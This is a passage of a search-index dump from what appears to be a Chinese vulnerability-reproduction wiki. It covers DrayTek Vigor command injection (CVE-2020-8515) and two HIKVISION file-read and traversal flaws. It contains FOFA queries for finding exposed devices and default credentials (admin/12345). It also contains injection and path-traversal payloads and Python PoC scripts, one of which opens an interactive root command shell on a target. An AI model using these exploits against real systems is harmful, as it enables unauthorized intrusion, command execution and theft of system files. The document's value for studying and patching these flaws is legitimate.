CVE-2020-8515"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DrayTek/DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/#draytek\u4f01\u4e1a\u7f51\u7edc\u8bbe\u5907-\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c-cve-2020-8515","text":"","title":"DrayTek\u4f01\u4e1a\u7f51\u7edc\u8bbe\u5907 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2020-8515"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DrayTek/DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/#\u6f0f\u6d1e\u63cf\u8ff0","text":"DrayTek URI\u672a\u80fd\u6b63\u786e\u5904\u7406SHELL\u5b57\u7b26\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u63d0\u4ea4\u7279\u6b8a\u7684\u8bf7\u6c42\uff0c\u53ef\u4ee5ROOT\u6743\u9650\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002 \u8fdc\u7a0b\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u88ab\u6807\u8bb0\u4e3aCVE-2020-8515\uff0c\u4e3b\u8981\u5f71\u54cd\u4e86DrayTek Vigor\u7f51\u7edc\u8bbe\u5907\uff0c\u5305\u62ec\u4f01\u4e1a\u4ea4\u6362\u673a\u3001\u8def\u7531\u5668\u3001\u8d1f\u8f7d\u5747\u8861\u5668\u548cVPN\u7f51\u5173\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DrayTek/DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Vigor2960 < v1.5.1 Vigor300B < v1.5.1 Vigor3900 < v1.5.1 VigorSwitch20P2121 <= v2.3.2 VigorSwitch20G1280 <= v2.3.2 VigorSwitch20P1280 <= v2.3.2 VigorSwitch20G2280 <= v2.3.2 VigorSwitch20P2280 <= v2.3.2","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DrayTek/DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/#fofa","text":"[!NOTE] title=\"Vigor 2960\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DrayTek/DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u6293\u5305 \u8bf7\u6c42\u5305\u5982\u4e0b POST /cgi-bin/mainfunction.cgi HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Content-Length: 67 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Content-Type: text/plain; charset=UTF-8 Accept: */* Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 action=login&keyPath=%27%0A%2fbin%2fls%0A%27&loginUser=a&loginPwd=a \u5176\u4e2d\u51fa\u73b0\u6ce8\u5165\u70b9\u7684\u53c2\u6570\u4e3a keyPath [!NOTE] \u51fa\u73b0\u7a7a\u683c\u9700\u8981\u66ff\u6362\uff0c\u4f8b\u5982 cat /etc/passwd \u2192 cat${IFS}/etc/passwd \u53ef\u4ee5\u4f7f\u7528 & \u6267\u884c\u989d\u5916\u4e00\u6761\u547d\u4ee4 (URL\u7f16\u7801\u4e3a %26)","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DrayTek/DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: DrayTek\u4f01\u4e1a\u7f51\u7edc\u8bbe\u5907 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> pwd \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/cgi-bin/mainfunction.cgi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } data = \"action=login&keyPath= %27% 0A %2f bin %2f cat$ {IFS} /etc/passwd%0A%27&loginUser=a&loginPwd=a\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} /cgi-bin/mainfunction.cgi \\033 [0m\" . format ( target_url )) if \"root\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u8bfb\u53d6 /etc/passwd \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) while True : Cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if Cmd == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , Cmd ) else : print ( \" \\033 [31m[x] \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) sys . exit ( 0 ) def POC_2 ( target_url , Cmd ): vuln_url = target_url + \"/cgi-bin/mainfunction.cgi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } Cmd = Cmd . replace ( ' ' , '$ {IFS} ' ) data = \"action=login&keyPath= %27% 0A %2f bin %2f %26 {} %0A%27&loginUser=a&loginPwd=a\" . format ( Cmd ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} /cgi-bin/mainfunction.cgi \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DrayTek/DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/#goby--poc","text":"[!NOTE] Goby\u4e2d\u5df2\u7ecf\u5305\u542b\u6b64\u6f0f\u6d1e","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/HIKVISION/HIKVISION%20%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2021-14544/","text":"HIKVISION \u6d41\u5a92\u4f53\u7ba1\u7406\u670d\u52a1\u5668 \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e CNVD-2021-14544 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u676d\u5dde\u6d77\u5eb7\u5a01\u89c6\u7cfb\u7edf\u6280\u672f\u6709\u9650\u516c\u53f8\u6d41\u5a92\u4f53\u7ba1\u7406\u670d\u52a1\u5668\u5b58\u5728\u5f31\u53e3\u4ee4\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u767b\u5f55\u540e\u53f0\u901a\u8fc7\u6587\u4ef6\u904d\u5386\u6f0f\u6d1e\u83b7\u53d6\u654f\u611f\u4fe1\u606f \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] HIKVISION \u6d41\u5a92\u4f53\u7ba1\u7406\u670d\u52a1\u5668 FOFA \u00b6 [!NOTE] title=\"\u6d41\u5a92\u4f53\u7ba1\u7406\u670d\u52a1\u5668\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b\uff0c \u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\u4e3a admin/12345 POC\u5982\u4e0b\uff0c\u8bbf\u95ee\u5982\u4e0bUrl\u4e0b\u8f7d system.ini\u6587\u4ef6 http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini \u6210\u529f\u8bfb\u53d6 C:/windows/system.ini","title":"HIKVISION \u6d41\u5a92\u4f53\u7ba1\u7406\u670d\u52a1\u5668 \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e CNVD-2021-14544"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/HIKVISION/HIKVISION%20%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2021-14544/#hikvision-\u6d41\u5a92\u4f53\u7ba1\u7406\u670d\u52a1\u5668-\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e-cnvd-2021-14544","text":"","title":"HIKVISION \u6d41\u5a92\u4f53\u7ba1\u7406\u670d\u52a1\u5668 \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e CNVD-2021-14544"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/HIKVISION/HIKVISION%20%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2021-14544/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u676d\u5dde\u6d77\u5eb7\u5a01\u89c6\u7cfb\u7edf\u6280\u672f\u6709\u9650\u516c\u53f8\u6d41\u5a92\u4f53\u7ba1\u7406\u670d\u52a1\u5668\u5b58\u5728\u5f31\u53e3\u4ee4\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u767b\u5f55\u540e\u53f0\u901a\u8fc7\u6587\u4ef6\u904d\u5386\u6f0f\u6d1e\u83b7\u53d6\u654f\u611f\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/HIKVISION/HIKVISION%20%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2021-14544/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] HIKVISION \u6d41\u5a92\u4f53\u7ba1\u7406\u670d\u52a1\u5668","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/HIKVISION/HIKVISION%20%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2021-14544/#fofa","text":"[!NOTE] title=\"\u6d41\u5a92\u4f53\u7ba1\u7406\u670d\u52a1\u5668\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/HIKVISION/HIKVISION%20%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2021-14544/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b\uff0c \u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\u4e3a admin/12345 POC\u5982\u4e0b\uff0c\u8bbf\u95ee\u5982\u4e0bUrl\u4e0b\u8f7d system.ini\u6587\u4ef6 http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini \u6210\u529f\u8bfb\u53d6 C:/windows/system.ini","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/HIKVISION/HIKVISION%20%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/","text":"HIKVISION \u89c6\u9891\u7f16\u7801\u8bbe\u5907\u63a5\u5165\u7f51\u5173 \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6d77\u5eb7\u5a01\u89c6\u89c6\u9891\u63a5\u5165\u7f51\u5173\u7cfb\u7edf\u5728\u9875\u9762/serverLog/downFile.php\u7684\u53c2\u6570fileName\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] HIKVISION \u89c6\u9891\u7f16\u7801\u8bbe\u5907\u63a5\u5165\u7f51\u5173 FOFA \u00b6 [!NOTE] title=\"\u89c6\u9891\u7f16\u7801\u8bbe\u5907\u63a5\u5165\u7f51\u5173\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u6587\u4ef6\u4e3a downFile.php , \u5176\u4e2d \u53c2\u6570 fileName \u6ca1\u6709\u8fc7\u6ee4\u5371\u9669\u5b57\u7b26\uff0c\u5bfc\u81f4\u53ef\u6587\u4ef6\u904d\u5386\u4e0b\u8f7d <?php $file_name = $_GET [ 'fileName' ]; $file_dir = \"../../../log/\" ; if ( ! file_exists ( $file_dir . $file_name )) { //\u68c0\u67e5\u6587\u4ef6\u662f\u5426\u5b58\u5728 echo '<script> alert(\"\u6587\u4ef6\u4e0d\u5b58\u5728!\");window.history.back(-1);</script>' ; exit (); } else { $file = fopen ( $file_dir . $file_name , \"r\" ); // \u6253\u5f00\u6587\u4ef6 // \u8f93\u5165\u6587\u4ef6\u6807\u7b7e Header ( \"Content-type: application/octet-stream\" ); Header ( \"Accept-Ranges: bytes\" ); Header ( \"Accept-Length: \" . filesize ( $file_dir . $file_name )); Header ( \"Content-Disposition: attachment; filename=\" . $file_name ); // \u8f93\u51fa\u6587\u4ef6\u5185\u5bb9 echo fread ( $file , filesize ( $file_dir . $file_name )); fclose ( $file ); exit (); } ?> \u8bbf\u95ee http://xxx.xxx.xxx.xxx/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php \u4e0b\u8f7d\u6587\u4ef6 \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: HIKVISION \u89c6\u9891\u7f16\u7801\u8bbe\u5907\u63a5\u5165\u7f51\u5173 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} /serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php \\033 [0m\" . format ( target_url )) if \"$file_name\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u8bfb\u53d6 downFile.php \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d HIKVISION_Video_coding_equipment_Download_any_file","title":"HIKVISION \u89c6\u9891\u7f16\u7801\u8bbe\u5907\u63a5\u5165\u7f51\u5173 \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/HIKVISION/HIKVISION%20%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#hikvision-\u89c6\u9891\u7f16\u7801\u8bbe\u5907\u63a5\u5165\u7f51\u5173-\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d","text":"","title":"HIKVISION \u89c6\u9891\u7f16\u7801\u8bbe\u5907\u63a5\u5165\u7f51\u5173 \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/HIKVISION/HIKVISION%20%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6d77\u5eb7\u5a01\u89c6\u89c6\u9891\u63a5\u5165\u7f51\u5173\u7cfb\u7edf\u5728\u9875\u9762/serverLog/downFile.php\u7684\u53c2\u6570fileName\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/HIKVISION/HIKVISION%20%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] HIKVISION \u89c6\u9891\u7f16\u7801\u8bbe\u5907\u63a5\u5165\u7f51\u5173","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/HIKVISION/HIKVISION%20%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#fofa","text":"[!NOTE] title=\"\u89c6\u9891\u7f16\u7801\u8bbe\u5907\u63a5\u5165\u7f51\u5173\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/HIKVISION/HIKVISION%20%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6f0f\u6d1e\u6587\u4ef6\u4e3a downFile.php , \u5176\u4e2d \u53c2\u6570 fileName \u6ca1\u6709\u8fc7\u6ee4\u5371\u9669\u5b57\u7b26\uff0c\u5bfc\u81f4\u53ef\u6587\u4ef6\u904d\u5386\u4e0b\u8f7d <?php $file_name = $_GET [ 'fileName' ]; $file_dir = \"../../../log/\" ; if ( ! file_exists ( $file_dir . $file_name )) { //\u68c0\u67e5\u6587\u4ef6\u662f\u5426\u5b58\u5728 echo '<script> alert(\"\u6587\u4ef6\u4e0d\u5b58\u5728!\");window.history.back(-1);</script>' ; exit (); } else { $file = fopen ( $file_dir . $file_name , \"r\" ); // \u6253\u5f00\u6587\u4ef6 // \u8f93\u5165\u6587\u4ef6\u6807\u7b7e Header ( \"Content-type: application/octet-stream\" ); Header ( \"Accept-Ranges: bytes\" ); Header ( \"Accept-Length: \" . filesize ( $file_dir . $file_name )); Header ( \"Content-Disposition: attachment; filename=\" . $file_name ); // \u8f93\u51fa\u6587\u4ef6\u5185\u5bb9 echo fread ( $file , filesize ( $file_dir . $file_name )); fclose ( $file ); exit (); } ?> \u8bbf\u95ee http://xxx.xxx.xxx.xxx/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php \u4e0b\u8f7d\u6587\u4ef6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/HIKVISION/HIKVISION%20%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: HIKVISION \u89c6\u9891\u7f16\u7801\u8bbe\u5907\u63a5\u5165\u7f51\u5173 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} /serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php \\033 [0m\" . format ( target_url )) if \"$file_name\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u8bfb\u53d6 downFile.php \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url 